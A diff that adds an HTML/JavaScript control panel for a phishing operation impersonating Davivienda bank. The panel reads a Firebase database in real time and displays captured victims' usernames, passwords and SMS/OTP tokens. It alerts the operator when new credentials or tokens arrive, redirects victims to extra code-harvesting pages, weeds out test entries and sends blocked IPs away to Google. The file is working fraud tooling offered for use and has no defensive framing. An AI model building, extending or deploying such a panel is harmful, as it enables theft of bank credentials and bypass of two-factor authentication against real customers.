@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>PANEL — Davivienda</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+@font-face{font-family:HelveticaNeueLTStdCn;src:url('https://www.davivienda.com.sv/assets/fonts/HelveticaNeueLTStdCn.woff2') format('woff2'),url('https://www.davivienda.com.sv/assets/fonts/HelveticaNeueLTStdCn.woff') format('woff')}
+@font-face{font-family:HelveticaNeueLTStdBdCn;src:url('https://www.davivienda.com.sv/assets/fonts/HelveticaNeueLTStdBdCn.woff2') format('woff2'),url('https://www.davivienda.com.sv/assets/fonts/HelveticaNeueLTStdBdCn.woff') format('woff')}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0b0b0b;font-family:"HelveticaNeueLTStdCn",Arial,sans-serif;color:#fff}
+.header{background:#ed1c27;border-bottom:3px solid #ad0000;padding:12px 26px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;gap:16px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:10px;font-family:"HelveticaNeueLTStdBdCn";font-size:20px;letter-spacing:1.5px;text-transform:uppercase;color:#fff}
+.logo img{height:26px;width:auto}
+.stats-bar{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.stat-item{background:rgba(0,0,0,.28);border:1px solid rgba(255,255,255,.25);padding:6px 14px;border-radius:6px;font-size:12px;color:#fff}
+.stat-item span{color:#fff;font-weight:bold;font-family:"HelveticaNeueLTStdBdCn"}
+.btn-header{padding:9px 18px;border:none;border-radius:6px;font-size:12px;font-weight:bold;cursor:pointer;text-transform:uppercase;letter-spacing:.8px;font-family:"HelveticaNeueLTStdBdCn"}
+.btn-pink{background:#fff;color:#ed1c27}
+.btn-pink:hover{background:#ffe4e6}
+.btn-dark{background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.35);color:#fff}
+.btn-dark:hover{background:#fff;color:#ed1c27;border-color:#fff}
+.table-container{padding:18px 26px}
+.table-header{display:grid;grid-template-columns:80px 120px 130px 130px 110px 130px 70px 1fr;gap:10px;padding:14px;background:#111;border-bottom:2px solid #ed1c27;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#888;font-weight:bold}
+.data-row{display:grid;grid-template-columns:80px 120px 130px 130px 110px 130px 70px 1fr;gap:10px;padding:14px 10px;background:#141414;border-left:4px solid #ed1c27;margin-bottom:8px;align-items:center;transition:background .2s}
+.data-row:hover{background:#1e1e1e}
+.data-row.spam{border-left-color:#ef4444;opacity:.65;background:#1a0a0a}
+.data-row.offline{border-left-color:#3f3f46;opacity:.55}
+.data-row.ip-bloqueada{border-left-color:#dc2626;background:#1a0505}
+.cell-status{display:flex;align-items:center;gap:8px;font-size:11px;font-weight:bold}
+.live-dot{width:8px;height:8px;background:#10b981;border-radius:50%;animation:blink 1.5s infinite}
+.offline-dot{width:8px;height:8px;background:#6b7280;border-radius:50%}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.cell-pagina{font-size:10px;color:#ed1c27;font-weight:bold;text-transform:uppercase}
+.cell-pagina.offline{color:#6b7280}
+.cell-user{color:#fff;font-weight:bold;font-size:13px;overflow:hidden;text-overflow:ellipsis}
+.cell-pass{color:#ffb3b8;font-weight:bold;font-size:13px;overflow:hidden;text-overflow:ellipsis}
+.tokens{display:flex;flex-direction:column;gap:4px}
+.cell-token{color:#10b981;font-weight:bold;font-size:14px;background:#0a1f15;padding:5px 10px;border-radius:5px;text-align:center;border:1px solid #10b981}
+.cell-token.b2{color:#60a5fa;background:#0a1622;border-color:#60a5fa}
+.cell-token.vacio{color:#666;background:#1a1a1a;border:1px solid #333}
+.cell-ip{color:#9ca3af;font-size:10px}
+.cell-ip.bloqueada{color:#dc2626;font-weight:bold}
+.cell-tiempo{font-size:10px;color:#6b7280}
+.actions{display:flex;gap:3px;justify-content:flex-end;flex-wrap:wrap}
+.btn-action{padding:5px 9px;border:none;border-radius:4px;font-size:8px;font-weight:bold;cursor:pointer;text-transform:uppercase;font-family:"HelveticaNeueLTStdBdCn"}
+.btn-sms1{background:#b91c1c;color:#fff}
+.btn-sms2{background:#7f1d1d;color:#fff}
+.btn-reject{background:#3f3f46;color:#d4d4d8}
+.btn-delete{background:#dc2626;color:#fff}
+.btn-block{background:#ed1c27;color:#fff}
+.btn-block:hover{background:#ad0000}
+#login-overlay{position:fixed;inset:0;background:radial-gradient(circle at 50% 0%,#ed1c27 0%,#7f0d13 45%,#0b0b0b 100%);z-index:1000;display:flex;align-items:center;justify-content:center}
+.login-box{background:#fff;border-top:6px solid #ed1c27;padding:44px 40px;border-radius:6px;width:100%;max-width:380px;text-align:center;box-shadow:0 24px 60px rgba(0,0,0,.6)}
+.login-box img{height:30px;margin:0 auto 22px}
+.login-box h2{font-family:"HelveticaNeueLTStdBdCn";font-size:20px;margin-bottom:22px;color:#22262a;text-transform:uppercase;letter-spacing:1px}
+.login-box input{width:100%;background:#f4f4f6;border:1px solid #d4d4d8;padding:13px;margin-bottom:12px;color:#22262a;border-radius:4px;font-size:14px;font-family:"HelveticaNeueLTStdCn"}
+.login-box button{width:100%;background:#ed1c27;color:#fff;border:none;padding:13px;font-weight:bold;cursor:pointer;border-radius:4px;text-transform:uppercase;letter-spacing:1.5px;box-shadow:inset 0 -3px 0 #ad0000;font-family:"HelveticaNeueLTStdBdCn"}
+.notificacion-flotante{position:fixed;top:96px;right:26px;padding:16px 24px;background:#141414;border-left:4px solid #10b981;color:#fff;font-weight:bold;z-index:200;transform:translateX(500px);transition:transform .3s;border-radius:4px}
+.notificacion-flotante.mostrar{transform:translateX(0)}
+.notificacion-otp{border-left-color:#ed1c27}
+.badge-count{background:#ed1c27;color:#fff;padding:2px 6px;border-radius:8px;font-size:9px;margin-left:3px}
+.badge-bloqueada{background:#dc2626;color:#fff;padding:2px 6px;border-radius:8px;font-size:9px;margin-left:3px}
+</style>
+</head>
+<body>
+
+<div id="notificacion" class="notificacion-flotante">
+  <i class="fa-solid fa-bell" style="margin-right:8px"></i><span id="notificacion-texto">Nuevo cliente</span>
+</div>
+
+<div id="login-overlay">
+  <div class="login-box">
+    <img src="https://www.davivienda.com.sv/assets/img/logos/logo-davivienda.png" alt="Davivienda">
+    <h2>Acceso al panel</h2>
+    <input type="text" id="admin-user" placeholder="USUARIO">
+    <input type="password" id="admin-pass" placeholder="CONTRASEÑA">
+    <button onclick="validarAcceso()">Entrar</button>
+    <p id="error-msg" style="color:#ed1c27;margin-top:14px;display:none;font-size:13px">Credenciales incorrectas</p>
+  </div>
+</div>
+
+<div id="panel-content" style="display:none">
+  <div class="header">
+    <div class="logo"><img src="https://www.davivienda.com.sv/assets/img/logos/logo-davivienda-footer.png" alt="">Panel</div>
+    <div class="stats-bar">
+      <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
+      <div class="stat-item">LIVE: <span id="stat-online">0</span></div>
+      <div class="stat-item">OFF: <span id="stat-offline">0</span></div>
+      <div class="stat-item">IPs: <span id="stat-ips">0</span></div>
+      <div class="stat-item">BLOQ: <span id="stat-bloqueadas">0</span></div>
+    </div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      <button class="btn-header btn-dark" onclick="cambiarVista('validos')">Registros</button>
+      <button class="btn-header btn-dark" onclick="cambiarVista('spam')">Spam</button>
+      <button class="btn-header btn-dark" onclick="cambiarVista('ips')">IPs</button>
+      <button class="btn-header btn-dark" onclick="cambiarVista('bloqueadas')">Bloqueadas</button>
+      <button class="btn-header btn-pink" onclick="limpiarTodo()">Limpiar</button>
+      <button class="btn-header btn-dark" onclick="cerrarSesion()">Salir</button>
+    </div>
+  </div>
+  <div class="table-container">
+    <div class="table-header">
+      <div>Estado</div><div>Página</div><div>Usuario</div><div>Contraseña</div><div>Token</div><div>IP</div><div>Último</div><div style="text-align:right">Acciones</div>
+    </div>
+    <div id="container"><div style="text-align:center;padding:40px;color:#666">Conectando a Firebase...</div></div>
+  </div>
+</div>
+
+<script>
+const DB_URL = "https://banficohxahn-default-rtdb.firebaseio.com/";
+let db, vistaActual = 'validos', datos = { validos: [], spam: [], blacklist: {} };
+let contadorIPs = {}, tokensVistos = {}, idsVistos = {}, audioAutorizado = false;
+
+const sonido = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
+function playSound() { if (!audioAutorizado) return; try { const a = sonido.cloneNode(); a.volume = 1; a.play().catch(() => {}); } catch (e) {} }
+function mostrarNotificacion(t, o) {
+  const n = document.getElementById('notificacion');
+  document.getElementById('notificacion-texto').textContent = t;
+  n.className = 'notificacion-flotante mostrar ' + (o ? 'notificacion-otp' : '');
+  setTimeout(() => n.classList.remove('mostrar'), 3000);
+}
+
+function esSpam(id, data) {
+  if (!data || typeof data !== 'object') return true;
+  if (!data.user || !data.pass) return true;
+  const p = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass', 'login'];
+  if (p.some(s => id.toLowerCase().includes(s))) return true;
+  const u = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'user1', '123456'];
+  if (u.includes((data.user || '').toLowerCase())) return true;
+  const c = ['test', 'prueba', 'admin', 'demo', '123', 'password', '123456'];
+  if (c.includes((data.pass || '').toLowerCase())) return true;
+  if (data.user.length < 3 || data.pass.length < 3) return true;
+  if (data.ip && datos.blacklist[data.ip] && datos.blacklist[data.ip].bloqueado) return true;
+  return false;
+}
+
+function validarAcceso() {
+  const u = document.getElementById('admin-user').value;
+  const p = document.getElementById('admin-pass').value;
+  if (u === "Ghost" && p === "Cabimas01.") {
+    sessionStorage.setItem('auth_panel', 'true');
+    document.getElementById('login-overlay').style.display = 'none';
+    document.getElementById('panel-content').style.display = 'block';
+    audioAutorizado = true; playSound(); iniciarFirebase();
+  } else {
+    document.getElementById('error-msg').style.display = 'block';
+  }
+}
+if (sessionStorage.getItem('auth_panel') === 'true') {
+  document.getElementById('login-overlay').style.display = 'none';
+  document.getElementById('panel-content').style.display = 'block';
+  audioAutorizado = true; iniciarFirebase();
+}
+function cerrarSesion() { sessionStorage.removeItem('auth_panel'); location.reload(); }
+
+function iniciarFirebase() {
+  if (!firebase.apps.length) firebase.initializeApp({ databaseURL: DB_URL });
+  db = firebase.database();
+
+  db.ref('logins').on('value', snap => {
+    const validos = []; contadorIPs = {}; let hayNuevo = false, hayOTP = false;
+    snap.forEach(child => {
+      const data = child.val(), id = child.key;
+      if (esSpam(id, data)) { db.ref('spam/' + id).set({ ...data, deletedAt: Date.now() }); db.ref('logins/' + id).remove(); return; }
+      if (data.ip && data.ip !== 'unknown') contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
+      if (!idsVistos[id]) { if (Object.keys(idsVistos).length > 0) hayNuevo = true; idsVistos[id] = true; tokensVistos[id] = ''; }
+
+      // vigila AMBOS campos por separado
+      const firma = (data.sms || '') + '|' + (data.otp || '');
+      if (firma !== '|' && firma !== tokensVistos[id]) {
+        if (tokensVistos[id] !== '') hayOTP = true;
+        tokensVistos[id] = firma;
+      }
+
+      validos.push({ id, data });
+    });
+    if (hayNuevo) { playSound(); mostrarNotificacion('¡NUEVO CLIENTE!', false); }
+    if (hayOTP) setTimeout(() => { playSound(); mostrarNotificacion('¡TOKEN RECIBIDO!', true); }, hayNuevo ? 500 : 0);
+    datos.validos = validos; renderizar();
+  });
+
+  db.ref('spam').on('value', snap => {
+    datos.spam = []; snap.forEach(c => datos.spam.push({ id: c.key, data: c.val() })); renderizar();
+  });
+
+  db.ref('blacklist').on('value', snap => {
+    datos.blacklist = snap.val() || {};
+    document.getElementById('stat-bloqueadas').textContent = Object.keys(datos.blacklist).length;
+    renderizar();
+  });
+}
+
+function cambiarVista(v) { vistaActual = v; renderizar(); }
+
+function rechazar(id) {
+  db.ref('comandos/' + id).set({ rechazar: true, redirect: 'inicio.html', ts: Date.now() });
+}
+
+function bloquearIP(ip) {
+  if (!ip || ip === 'unknown') return alert('IP inválida');
+  const k = ip.replace(/\./g, '_');
+  if (confirm(`¿BLOQUEAR IP ${ip}?\n\nLos visitantes con esta IP serán redirigidos a Google.com`)) {
+    db.ref('blacklist/' + k).set({ ip: ip, bloqueado: true, redirigirA: 'https://google.com', fecha: Date.now() }).then(() => {
+      datos.validos.forEach(({ id, data }) => {
+        if (data.ip === ip) { db.ref('spam/' + id).set({ ...data, ipBloqueada: true }); db.ref('logins/' + id).remove(); }
+      });
+    });
+  }
+}
+function desbloquearIP(ip) { if (!ip) return; if (confirm(`¿Desbloquear IP ${ip}?`)) db.ref('blacklist/' + ip.replace(/\./g, '_')).remove(); }
+
+// ---------- LIMPIAR TODO ----------
+function limpiarTodo() {
+  if (!confirm('¿Eliminar TODOS los registros?\n\nSe borran logins, spam y comandos pendientes.\nLa blacklist de IPs se conserva.')) return;
+
+  Promise.all([
+    db.ref('logins').remove(),
+    db.ref('spam').remove(),
+    db.ref('comandos').remove()
+  ]).then(() => {
+    idsVistos = {}; tokensVistos = {}; contadorIPs = {};
+    datos.validos = []; datos.spam = [];
+    renderizar();
+    mostrarNotificacion('Registros eliminados', false);
+  }).catch(e => alert('No se pudo limpiar: ' + e.message));
+}
+
+function tiempoTranscurrido(t) {
+  if (!t) return '-';
+  const s = Math.floor((Date.now() - t) / 1000);
+  if (s < 60) return s + 's'; if (s < 3600) return Math.floor(s / 60) + 'm';
+  return Math.floor(s / 3600) + 'h';
+}
+
+function renderizar() {
+  const c = document.getElementById('container'); c.innerHTML = '';
+  let on = 0, off = 0;
+  datos.validos.forEach(({ data }) => { data.online ? on++ : off++; });
+  document.getElementById('stat-total').textContent = datos.validos.length;
+  document.getElementById('stat-online').textContent = on;
+  document.getElementById('stat-offline').textContent = off;
+  document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;
+
+  if (vistaActual === 'ips') return renderizarIPs();
+  if (vistaActual === 'bloqueadas') return renderizarBloqueadas();
+
+  const lista = vistaActual === 'validos' ? datos.validos : vistaActual === 'spam' ? datos.spam : [...datos.validos, ...datos.spam];
+  if (!lista.length) { c.innerHTML = '<div style="text-align:center;padding:50px;color:#666">SIN REGISTROS</div>'; return; }
+
+  lista.forEach(({ id, data }) => {
+    const sms = data.sms || '', otp = data.otp || '';
+    const vecesIP = contadorIPs[data.ip] || 1, online = data.online === true;
+    const ipBloq = data.ip && datos.blacklist[data.ip] && datos.blacklist[data.ip].bloqueado;
+    let r = 'data-row';
+    if (vistaActual === 'spam') r += ' spam';
+    if (!online) r += ' offline';
+    if (ipBloq) r += ' ip-bloqueada';
+
+    let tokens = '';
+    if (sms) tokens += `<div class="cell-token" title="SMS 1">${sms}</div>`;
+    if (otp) tokens += `<div class="cell-token b2" title="SMS 2">${otp}</div>`;
+    if (!sms && !otp) tokens = '<div class="cell-token vacio">----</div>';
+
+    c.innerHTML += `
+      <div class="${r}">
+        <div class="cell-status">${online ? '<div class="live-dot"></div>LIVE' : '<div class="offline-dot"></div>OFF'}</div>
+        <div class="cell-pagina ${!online ? 'offline' : ''}">${data.pagina || 'SALIO'}</div>
+        <div class="cell-user">${data.user || 'N/A'}</div>
+        <div class="cell-pass">${data.pass || '****'}</div>
+        <div class="tokens">${tokens}</div>
+        <div class="cell-ip ${ipBloq ? 'bloqueada' : ''}">${data.ip || 'N/A'}${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}${ipBloq ? '<span class="badge-bloqueada">BLOQ</span>' : ''}</div>
+        <div class="cell-tiempo">${tiempoTranscurrido(data.ultimoPing)}</div>
+        <div class="actions">${vistaActual !== 'spam' ? `
+          <button class="btn-action btn-sms1" onclick="db.ref('comandos/${id}').set({redirect:'sms.html'})">SMS 1</button>
+          <button class="btn-action btn-sms2" onclick="db.ref('comandos/${id}').set({redirect:'sms2.html'})">SMS 2</button>
+          <button class="btn-action btn-reject" onclick="rechazar('${id}')">Rechazar</button>
+          ${data.ip && data.ip !== 'unknown' ? `<button class="btn-action btn-block" onclick="bloquearIP('${data.ip}')">Bloquear IP</button>` : ''}
+          <button class="btn-action btn-delete" onclick="db.ref('logins/${id}').remove()">Eliminar</button>` : `
+          <button class="btn-action btn-sms1" onclick="recuperar('${id}')">Recuperar</button>
+          <button class="btn-action btn-delete" onclick="db.ref('spam/${id}').remove()">Eliminar</button>`}
+        </div>
+      </div>`;
+  });
+}
+
+function renderizarIPs() {
+  const c = document.getElementById('container'), ips = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
+  if (!ips.length) { c.innerHTML = '<div style="text-align:center;padding:50px;color:#666">SIN IPs</div>'; return; }
+  let h = '<div style="background:#111;padding:20px;border-radius:10px"><table style="width:100%;border-collapse:collapse"><tr style="color:#888;font-size:12px;border-bottom:1px solid #333"><th>IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
+  ips.forEach(([i, n]) => {
+    const b = datos.blacklist[i] && datos.blacklist[i].bloqueado;
+    h += `<tr style="border-bottom:1px solid #1f1f1f"><td style="padding:14px;color:${b ? '#dc2626' : '#fff'}">${i}</td>
+      <td style="padding:14px"><span style="background:${n >= 10 ? '#dc2626' : n >= 5 ? '#f59e0b' : '#10b981'};color:#fff;padding:2px 10px;border-radius:10px;font-size:11px">${n}</span></td>
+      <td style="padding:14px;color:${b ? '#dc2626' : '#10b981'}">${b ? 'BLOQUEADA → GOOGLE' : 'ACTIVA'}</td>
+      <td style="padding:14px">${b ? `<button onclick="desbloquearIP('${i}')" class="btn-action btn-sms1" style="padding:5px 14px;font-size:10px">Desbloquear</button>` : `<button onclick="bloquearIP('${i}')" class="btn-action btn-block" style="padding:5px 14px;font-size:10px">Bloquear</button>`}</td></tr>`;
+  });
+  c.innerHTML = h + '</table></div>';
+}
+
+function renderizarBloqueadas() {
+  const c = document.getElementById('container'), ips = Object.entries(datos.blacklist).filter(([k, v]) => v.bloqueado);
+  if (!ips.length) { c.innerHTML = '<div style="text-align:center;padding:50px;color:#666">SIN IPs BLOQUEADAS</div>'; return; }
+  let h = '<div style="background:#1a0505;border:1px solid #dc2626;padding:20px;border-radius:10px"><h3 style="color:#ed1c27;margin-bottom:18px">IPs BLOQUEADAS (redirigen a Google)</h3><table style="width:100%;border-collapse:collapse"><tr style="color:#ef4444;font-size:12px;border-bottom:1px solid #7f1d1d"><th>IP</th><th>DESDE</th><th>REDIRECCIÓN</th><th>ACCIONES</th></tr>';
+  ips.forEach(([k, d]) => {
+    h += `<tr style="border-bottom:1px solid #1f1f1f"><td style="padding:14px;color:#dc2626;font-weight:bold">${d.ip}</td>
+      <td style="padding:14px;color:#fca5a5;font-size:12px">${d.fecha ? new Date(d.fecha).toLocaleString() : '-'}</td>
+      <td style="padding:14px;color:#f59e0b;font-size:12px">${d.redirigirA || 'https://google.com'}</td>
+      <td style="padding:14px"><button onclick="desbloquearIP('${d.ip}')" class="btn-action btn-sms1" style="padding:5px 14px;font-size:10px">Desbloquear</button></td></tr>`;
+  });
+  c.innerHTML = h + '</table></div>';
+}
+
+function recuperar(id) {
+  db.ref('spam/' + id).once('value').then(s => {
+    const d = s.val(); if (d) { db.ref('logins/' + id).set(d); db.ref('spam/' + id).remove(); }
+  });
+}
+</script>
+</body>
+</html>
